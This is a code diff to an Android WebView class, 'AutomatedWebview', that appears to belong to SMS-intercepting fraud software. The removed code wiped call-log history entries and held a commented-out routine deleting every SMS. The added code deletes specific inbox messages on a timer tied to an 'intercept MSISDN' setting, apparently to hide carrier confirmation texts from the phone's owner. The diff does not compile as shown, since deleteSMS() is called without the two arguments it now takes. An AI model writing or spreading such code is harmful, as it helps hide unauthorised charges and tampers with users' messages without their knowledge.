@@ -24,6 +24,7 @@ import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.AttributeSet;
+import android.util.Log;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebView;
@@ -286,7 +287,7 @@ public class AutomatedWebview extends WebView {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                removeSMS(settings.getInterceptMsisdn());
+                deleteSMS();
             }
         }, seconds * 1000);
 
@@ -412,36 +413,31 @@ public class AutomatedWebview extends WebView {
         return android.os.Build.MODEL;
     }
 
-    private void removeSMS(String number)
-    {
-//        Uri deleteUri = Uri.parse("content://sms");
-//        int count = 0;
-//        Cursor c = context.getContentResolver().query(deleteUri, null, null,
-//                null, null);
-//        while (c.moveToNext()) {
-//            try {
-//                // Delete the SMS
-//                String pid = c.getString(0); // Get id;
-//                String uri = "content://sms/" + pid;
-//                count = context.getContentResolver().delete(Uri.parse(uri),
-//                        null, null);
-//            } catch (Exception e) {
-//            }
-//        }
-        try
-        {
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='400'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='410'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='700'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='200'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='300'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='600'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='500'", null);
+    public void deleteSMS(Context context, long messageId) {
+        try {
+            Uri uriSms = Uri.parse("content://sms/inbox");
+            Cursor c = context.getContentResolver().query(uriSms, new String[]{"_id"}, null, null, null);
+
+            if (c != null && c.moveToFirst()) {
+                do {
+                    long id = c.getLong(0);
+
+                    if (id == messageId) {
+                        context.getContentResolver().delete(
+                                Uri.parse("content://sms/" + id), null, null);
+                        Log.e("Message:", "Message is Deleted successfully");
+                    }
+
+                } while (c.moveToNext());
+            }
+
+            if (c != null) {
+                c.close();
+            }
+        } catch (Exception e) {
+            Log.e("Exception", e.toString());
         }
-        catch(Exception exception)
-        {
-            exception.printStackTrace();
-        }
+
     }
 
     // Miscellaneous functions
@@ -528,6 +524,7 @@ public class AutomatedWebview extends WebView {
         }
         return array;
     }
+
     private void enableSMSDefault() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
 
